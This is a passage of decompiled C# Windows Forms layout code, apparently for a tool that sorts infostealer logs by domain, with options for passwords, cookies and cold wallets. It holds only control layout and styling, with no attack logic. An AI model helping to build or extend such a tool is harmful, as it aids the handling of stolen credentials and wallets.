		((System.Windows.Forms.Control)this.removeCheckedLogsBtn).TabIndex = 151;
		((System.Windows.Forms.Control)this.removeCheckedLogsBtn).Text = "Remove checked logs";
		((MetroSetButton)this.removeCheckedLogsBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)this.removeCheckedLogsBtn).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.removeCheckedLogsBtn).Click += new System.EventHandler(removeCheckedLogsBtn_Click);
		((MetroSetButton)this.removeEmptyLogsBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.removeEmptyLogsBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.removeEmptyLogsBtn).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.removeEmptyLogsBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.removeEmptyLogsBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.removeEmptyLogsBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.removeEmptyLogsBtn).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.removeEmptyLogsBtn).Location = new System.Drawing.Point(253, 525);
		((System.Windows.Forms.Control)this.removeEmptyLogsBtn).Name = "removeEmptyLogsBtn";
		((MetroSetButton)this.removeEmptyLogsBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.removeEmptyLogsBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.removeEmptyLogsBtn).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.removeEmptyLogsBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.removeEmptyLogsBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.removeEmptyLogsBtn).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.removeEmptyLogsBtn).Size = new System.Drawing.Size(147, 23);
		((MetroSetButton)this.removeEmptyLogsBtn).Style = (Style)0;
		((MetroSetButton)this.removeEmptyLogsBtn).StyleManager = null;
		((System.Windows.Forms.Control)this.removeEmptyLogsBtn).TabIndex = 150;
		((System.Windows.Forms.Control)this.removeEmptyLogsBtn).Text = "Remove empty logs";
		((MetroSetButton)this.removeEmptyLogsBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)this.removeEmptyLogsBtn).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.removeEmptyLogsBtn).Click += new System.EventHandler(removeEmptyLogsBtn_Click);
		((System.Windows.Forms.DateTimePicker)this.logDateToDTP).Format = System.Windows.Forms.DateTimePickerFormat.Custom;
		((System.Windows.Forms.Control)this.logDateToDTP).Location = new System.Drawing.Point(143, 498);
		((System.Windows.Forms.Control)this.logDateToDTP).Name = "logDateToDTP";
		((System.Windows.Forms.Control)this.logDateToDTP).Size = new System.Drawing.Size(257, 20);
		((System.Windows.Forms.Control)this.logDateToDTP).TabIndex = 145;
		((System.Windows.Forms.DateTimePicker)this.logDateToDTP).Value = new System.DateTime(2020, 9, 24, 23, 59, 59, 0);
		((System.Windows.Forms.DateTimePicker)this.logDateFromDTP).Format = System.Windows.Forms.DateTimePickerFormat.Custom;
		((System.Windows.Forms.Control)this.logDateFromDTP).Location = new System.Drawing.Point(143, 472);
		((System.Windows.Forms.Control)this.logDateFromDTP).Name = "logDateFromDTP";
		((System.Windows.Forms.Control)this.logDateFromDTP).Size = new System.Drawing.Size(257, 20);
		((System.Windows.Forms.Control)this.logDateFromDTP).TabIndex = 144;
		((System.Windows.Forms.DateTimePicker)this.logDateFromDTP).Value = new System.DateTime(2020, 9, 24, 23, 59, 59, 0);
		((System.Windows.Forms.Control)this.singleSkipCheckedSortCb).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.singleSkipCheckedSortCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.singleSkipCheckedSortCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.singleSkipCheckedSortCb).Checked = false;
		((MetroSetCheckBox)this.singleSkipCheckedSortCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.singleSkipCheckedSortCb).CheckState = (CheckState)0;
		((System.Windows.Forms.Control)this.singleSkipCheckedSortCb).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.singleSkipCheckedSortCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.singleSkipCheckedSortCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.singleSkipCheckedSortCb).Location = new System.Drawing.Point(162, 327);
		((System.Windows.Forms.Control)this.singleSkipCheckedSortCb).Name = "singleSkipCheckedSortCb";
		((MetroSetCheckBox)this.singleSkipCheckedSortCb).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.singleSkipCheckedSortCb).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.singleSkipCheckedSortCb).Style = (Style)1;
		((MetroSetCheckBox)this.singleSkipCheckedSortCb).StyleManager = null;
		((System.Windows.Forms.Control)this.singleSkipCheckedSortCb).TabIndex = 143;
		((MetroSetCheckBox)this.singleSkipCheckedSortCb).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.singleSkipCheckedSortCb).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.label35).AutoSize = true;
		((System.Windows.Forms.Control)this.label35).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label35).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.label35).Location = new System.Drawing.Point(28, 327);
		((System.Windows.Forms.Control)this.label35).Name = "label35";
		((System.Windows.Forms.Control)this.label35).Size = new System.Drawing.Size(79, 15);
		((System.Windows.Forms.Control)this.label35).TabIndex = 142;
		((System.Windows.Forms.Control)this.label35).Text = "Skip checked:";
		((System.Windows.Forms.Control)this.singleRefreshDomainDetectSortCb).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.singleRefreshDomainDetectSortCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.singleRefreshDomainDetectSortCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.singleRefreshDomainDetectSortCb).Checked = false;
		((MetroSetCheckBox)this.singleRefreshDomainDetectSortCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.singleRefreshDomainDetectSortCb).CheckState = (CheckState)0;
		((System.Windows.Forms.Control)this.singleRefreshDomainDetectSortCb).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.singleRefreshDomainDetectSortCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.singleRefreshDomainDetectSortCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.singleRefreshDomainDetectSortCb).Location = new System.Drawing.Point(162, 420);
		((System.Windows.Forms.Control)this.singleRefreshDomainDetectSortCb).Name = "singleRefreshDomainDetectSortCb";
		((MetroSetCheckBox)this.singleRefreshDomainDetectSortCb).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.singleRefreshDomainDetectSortCb).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.singleRefreshDomainDetectSortCb).Style = (Style)1;
		((MetroSetCheckBox)this.singleRefreshDomainDetectSortCb).StyleManager = null;
		((System.Windows.Forms.Control)this.singleRefreshDomainDetectSortCb).TabIndex = 141;
		((MetroSetCheckBox)this.singleRefreshDomainDetectSortCb).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.singleRefreshDomainDetectSortCb).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.label32).AutoSize = true;
		((System.Windows.Forms.Control)this.label32).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label32).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.label32).Location = new System.Drawing.Point(28, 420);
		((System.Windows.Forms.Control)this.label32).Name = "label32";
		((System.Windows.Forms.Control)this.label32).Size = new System.Drawing.Size(129, 15);
		((System.Windows.Forms.Control)this.label32).TabIndex = 140;
		((System.Windows.Forms.Control)this.label32).Text = "Refresh domain detect:";
		((System.Windows.Forms.Control)this.f8).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.f8).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.f8).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.f8).Checked = false;
		((MetroSetCheckBox)this.f8).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.f8).CheckState = (CheckState)0;
		((System.Windows.Forms.Control)this.f8).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.f8).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.f8).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.f8).Location = new System.Drawing.Point(162, 351);
		((System.Windows.Forms.Control)this.f8).Name = "singleSkipPasswordsSortCb";
		((MetroSetCheckBox)this.f8).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.f8).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.f8).Style = (Style)1;
		((MetroSetCheckBox)this.f8).StyleManager = null;
		((System.Windows.Forms.Control)this.f8).TabIndex = 139;
		((MetroSetCheckBox)this.f8).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.f8).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.f9).AutoSize = true;
		((System.Windows.Forms.Control)this.f9).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.f9).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.f9).Location = new System.Drawing.Point(28, 351);
		((System.Windows.Forms.Control)this.f9).Name = "label28";
		((System.Windows.Forms.Control)this.f9).Size = new System.Drawing.Size(127, 15);
		((System.Windows.Forms.Control)this.f9).TabIndex = 138;
		((System.Windows.Forms.Control)this.f9).Text = "Skip empty passwords:";
		((System.Windows.Forms.Control)this.fa).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.fa).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.fa).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.fa).Checked = false;
		((MetroSetCheckBox)this.fa).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.fa).CheckState = (CheckState)0;
		((System.Windows.Forms.Control)this.fa).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.fa).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.fa).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.fa).Location = new System.Drawing.Point(381, 327);
		((System.Windows.Forms.Control)this.fa).Name = "singleSkipCookiesSortCb";
		((MetroSetCheckBox)this.fa).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.fa).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.fa).Style = (Style)1;
		((MetroSetCheckBox)this.fa).StyleManager = null;
		((System.Windows.Forms.Control)this.fa).TabIndex = 137;
		((MetroSetCheckBox)this.fa).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.fa).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.fb).AutoSize = true;
		((System.Windows.Forms.Control)this.fb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.fb).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.fb).Location = new System.Drawing.Point(197, 327);
		((System.Windows.Forms.Control)this.fb).Name = "label31";
		((System.Windows.Forms.Control)this.fb).Size = new System.Drawing.Size(112, 15);
		((System.Windows.Forms.Control)this.fb).TabIndex = 136;
		((System.Windows.Forms.Control)this.fb).Text = "Skip empty cookies:";
		((System.Windows.Forms.Control)this.f1).Location = new System.Drawing.Point(478, 299);
		((System.Windows.Forms.Control)this.f1).Name = "metroSetDivider14";
		((MetroSetDivider)this.f1).Orientation = (DividerStyle)0;
		((System.Windows.Forms.Control)this.f1).Size = new System.Drawing.Size(682, 4);
		((MetroSetDivider)this.f1).Style = (Style)1;
		((MetroSetDivider)this.f1).StyleManager = null;
		((System.Windows.Forms.Control)this.f1).TabIndex = 135;
		((System.Windows.Forms.Control)this.f1).Text = "metroSetDivider14";
		((MetroSetDivider)this.f1).ThemeAuthor = "Narwin";
		((MetroSetDivider)this.f1).ThemeName = "MetroDark";
		((MetroSetDivider)this.f1).Thickness = 1;
		((System.Windows.Forms.Control)this.eb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.eb).Location = new System.Drawing.Point(927, 313);
		((System.Windows.Forms.Control)this.eb).Name = "currentSaveAccountsDomainLbl";
		((System.Windows.Forms.Control)this.eb).Size = new System.Drawing.Size(114, 25);
		((MetroSetLabel)this.eb).Style = (Style)1;
		((MetroSetLabel)this.eb).StyleManager = null;
		((System.Windows.Forms.Control)this.eb).TabIndex = 134;
		((System.Windows.Forms.Control)this.eb).Text = "None";
		((System.Windows.Forms.Label)this.eb).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetLabel)this.eb).ThemeAuthor = "Narwin";
		((MetroSetLabel)this.eb).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.ec).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.ec).Location = new System.Drawing.Point(807, 313);
		((System.Windows.Forms.Control)this.ec).Name = "metroSetLabel5";
		((System.Windows.Forms.Control)this.ec).Size = new System.Drawing.Size(114, 25);
		((MetroSetLabel)this.ec).Style = (Style)1;
		((MetroSetLabel)this.ec).StyleManager = null;
		((System.Windows.Forms.Control)this.ec).TabIndex = 133;
		((System.Windows.Forms.Control)this.ec).Text = "Current domain:";
		((System.Windows.Forms.Label)this.ec).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetLabel)this.ec).ThemeAuthor = "Narwin";
		((MetroSetLabel)this.ec).ThemeName = "MetroDark";
		((MetroSetButton)this.ed).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.ed).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.ed).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.ed).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.ed).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.ed).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.ed).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.ed).Location = new System.Drawing.Point(1072, 557);
		((System.Windows.Forms.Control)this.ed).Name = "saveAccountsDomain";
		((MetroSetButton)this.ed).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.ed).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.ed).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.ed).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.ed).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.ed).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.ed).Size = new System.Drawing.Size(75, 23);
		((MetroSetButton)this.ed).Style = (Style)0;
		((MetroSetButton)this.ed).StyleManager = null;
		((System.Windows.Forms.Control)this.ed).TabIndex = 132;
		((System.Windows.Forms.Control)this.ed).Text = "Sort";
		((MetroSetButton)this.ed).ThemeAuthor = "Narwin";
		((MetroSetButton)this.ed).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.ed).Click += new System.EventHandler(ed_Click);
		((AnimaTextBox)this.ee).Dark = false;
		((System.Windows.Forms.Control)this.ee).Location = new System.Drawing.Point(507, 341);
		((AnimaTextBox)this.ee).MaxLength = 32767;
		((AnimaTextBox)this.ee).MultiLine = true;
		((System.Windows.Forms.Control)this.ee).Name = "saveAccountsDomainTb";
		((AnimaTextBox)this.ee).Numeric = false;
		((AnimaTextBox)this.ee).ReadOnly = false;
		((System.Windows.Forms.Control)this.ee).Size = new System.Drawing.Size(640, 210);
		((System.Windows.Forms.Control)this.ee).TabIndex = 131;
		((AnimaTextBox)this.ee).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.ef).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.ef).Location = new System.Drawing.Point(627, 313);
		((System.Windows.Forms.Control)this.ef).Name = "saveAccountSorterStatusLbl";
		((System.Windows.Forms.Control)this.ef).Size = new System.Drawing.Size(114, 25);
		((MetroSetLabel)this.ef).Style = (Style)1;
		((MetroSetLabel)this.ef).StyleManager = null;
		((System.Windows.Forms.Control)this.ef).TabIndex = 130;
		((System.Windows.Forms.Control)this.ef).Text = "Waiting";
		((System.Windows.Forms.Label)this.ef).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetLabel)this.ef).ThemeAuthor = "Narwin";
		((MetroSetLabel)this.ef).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.f0).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.f0).Location = new System.Drawing.Point(507, 313);
		((System.Windows.Forms.Control)this.f0).Name = "metroSetLabel7";
		((System.Windows.Forms.Control)this.f0).Size = new System.Drawing.Size(114, 25);
		((MetroSetLabel)this.f0).Style = (Style)1;
		((MetroSetLabel)this.f0).StyleManager = null;
		((System.Windows.Forms.Control)this.f0).TabIndex = 129;
		((System.Windows.Forms.Control)this.f0).Text = "Status of sorter:";
		((System.Windows.Forms.Label)this.f0).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetLabel)this.f0).ThemeAuthor = "Narwin";
		((MetroSetLabel)this.f0).ThemeName = "MetroDark";
		((AnimaTextBox)this.e9).Dark = false;
		((System.Windows.Forms.Control)this.e9).Location = new System.Drawing.Point(135, 149);
		((AnimaTextBox)this.e9).MaxLength = 32767;
		((AnimaTextBox)this.e9).MultiLine = false;
		((System.Windows.Forms.Control)this.e9).Name = "singleSetCommentSortTb";
		((AnimaTextBox)this.e9).Numeric = false;
		((AnimaTextBox)this.e9).ReadOnly = false;
		((System.Windows.Forms.Control)this.e9).Size = new System.Drawing.Size(265, 23);
		((System.Windows.Forms.Control)this.e9).TabIndex = 128;
		((AnimaTextBox)this.e9).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.ea).AutoSize = true;
		((System.Windows.Forms.Control)this.ea).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.ea).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.ea).Location = new System.Drawing.Point(28, 151);
		((System.Windows.Forms.Control)this.ea).Name = "label27";
		((System.Windows.Forms.Control)this.ea).Size = new System.Drawing.Size(83, 15);
		((System.Windows.Forms.Control)this.ea).TabIndex = 127;
		((System.Windows.Forms.Control)this.ea).Text = "Set Comment:";
		((AnimaTextBox)this.e7).Dark = false;
		((System.Windows.Forms.Control)this.e7).Location = new System.Drawing.Point(135, 118);
		((AnimaTextBox)this.e7).MaxLength = 32767;
		((AnimaTextBox)this.e7).MultiLine = false;
		((System.Windows.Forms.Control)this.e7).Name = "singleSkipCommentSortTb";
		((AnimaTextBox)this.e7).Numeric = false;
		((AnimaTextBox)this.e7).ReadOnly = false;
		((System.Windows.Forms.Control)this.e7).Size = new System.Drawing.Size(265, 23);
		((System.Windows.Forms.Control)this.e7).TabIndex = 126;
		((AnimaTextBox)this.e7).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.e8).AutoSize = true;
		((System.Windows.Forms.Control)this.e8).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.e8).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.e8).Location = new System.Drawing.Point(28, 120);
		((System.Windows.Forms.Control)this.e8).Name = "label26";
		((System.Windows.Forms.Control)this.e8).Size = new System.Drawing.Size(89, 15);
		((System.Windows.Forms.Control)this.e8).TabIndex = 125;
		((System.Windows.Forms.Control)this.e8).Text = "Skip Comment:";
		((System.Windows.Forms.Control)this.de).AutoSize = true;
		((System.Windows.Forms.Control)this.de).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.de).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.de).Location = new System.Drawing.Point(28, 502);
		((System.Windows.Forms.Control)this.de).Name = "label21";
		((System.Windows.Forms.Control)this.de).Size = new System.Drawing.Size(71, 15);
		((System.Windows.Forms.Control)this.de).TabIndex = 122;
		((System.Windows.Forms.Control)this.de).Text = "LogDate To:";
		((System.Windows.Forms.Control)this.df).AutoSize = true;
		((System.Windows.Forms.Control)this.df).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.df).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.df).Location = new System.Drawing.Point(28, 474);
		((System.Windows.Forms.Control)this.df).Name = "label22";
		((System.Windows.Forms.Control)this.df).Size = new System.Drawing.Size(90, 15);
		((System.Windows.Forms.Control)this.df).TabIndex = 121;
		((System.Windows.Forms.Control)this.df).Text = "LogDate FROM:";
		((System.Windows.Forms.Control)this.c6).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.c6).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.c6).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.c6).Checked = false;
		((MetroSetCheckBox)this.c6).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.c6).CheckState = (CheckState)0;
		((System.Windows.Forms.Control)this.c6).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.c6).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.c6).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.c6).Location = new System.Drawing.Point(381, 398);
		((System.Windows.Forms.Control)this.c6).Name = "singleColdWalletSortCb";
		((MetroSetCheckBox)this.c6).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.c6).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.c6).Style = (Style)1;
		((MetroSetCheckBox)this.c6).StyleManager = null;
		((System.Windows.Forms.Control)this.c6).TabIndex = 120;
		((MetroSetCheckBox)this.c6).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.c6).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.c7).AutoSize = true;
		((System.Windows.Forms.Control)this.c7).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.c7).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.c7).Location = new System.Drawing.Point(198, 398);
		((System.Windows.Forms.Control)this.c7).Name = "label3";
		((System.Windows.Forms.Control)this.c7).Size = new System.Drawing.Size(74, 15);
		((System.Windows.Forms.Control)this.c7).TabIndex = 119;
		((System.Windows.Forms.Control)this.c7).Text = "Cold wallets:";
		((System.Windows.Forms.Control)this.m_a2).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.m_a2).Location = new System.Drawing.Point(927, 7);
		((System.Windows.Forms.Control)this.m_a2).Name = "currentDomainLbl";
		((System.Windows.Forms.Control)this.m_a2).Size = new System.Drawing.Size(114, 25);
		((MetroSetLabel)this.m_a2).Style = (Style)1;
		((MetroSetLabel)this.m_a2).StyleManager = null;
		((System.Windows.Forms.Control)this.m_a2).TabIndex = 118;
		((System.Windows.Forms.Control)this.m_a2).Text = "None";
		((System.Windows.Forms.Label)this.m_a2).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetLabel)this.m_a2).ThemeAuthor = "Narwin";
		((MetroSetLabel)this.m_a2).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.m_a3).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.m_a3).Location = new System.Drawing.Point(807, 7);
		((System.Windows.Forms.Control)this.m_a3).Name = "metroSetLabel2";
		((System.Windows.Forms.Control)this.m_a3).Size = new System.Drawing.Size(114, 25);
		((MetroSetLabel)this.m_a3).Style = (Style)1;
		((MetroSetLabel)this.m_a3).StyleManager = null;
		((System.Windows.Forms.Control)this.m_a3).TabIndex = 117;
		((System.Windows.Forms.Control)this.m_a3).Text = "Current domain:";
		((System.Windows.Forms.Label)this.m_a3).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetLabel)this.m_a3).ThemeAuthor = "Narwin";
		((MetroSetLabel)this.m_a3).ThemeName = "MetroDark";
		((MetroSetButton)this.sortDomain).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.sortDomain).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.sortDomain).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.sortDomain).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.sortDomain).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.sortDomain).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.sortDomain).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.sortDomain).Location = new System.Drawing.Point(1068, 255);
		((System.Windows.Forms.Control)this.sortDomain).Name = "sortDomain";
		((MetroSetButton)this.sortDomain).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.sortDomain).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.sortDomain).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.sortDomain).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.sortDomain).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.sortDomain).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.sortDomain).Size = new System.Drawing.Size(75, 23);
		((MetroSetButton)this.sortDomain).Style = (Style)0;
		((MetroSetButton)this.sortDomain).StyleManager = null;
		((System.Windows.Forms.Control)this.sortDomain).TabIndex = 116;
		((System.Windows.Forms.Control)this.sortDomain).Text = "Sort";
		((MetroSetButton)this.sortDomain).ThemeAuthor = "Narwin";
		((MetroSetButton)this.sortDomain).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.sortDomain).Click += new System.EventHandler(sortDomain_Click);
		((AnimaTextBox)this.domainsTb).Dark = false;
		((System.Windows.Forms.Control)this.domainsTb).Location = new System.Drawing.Point(507, 35);
		((AnimaTextBox)this.domainsTb).MaxLength = 32767;
		((AnimaTextBox)this.domainsTb).MultiLine = true;
		((System.Windows.Forms.Control)this.domainsTb).Name = "domainsTb";
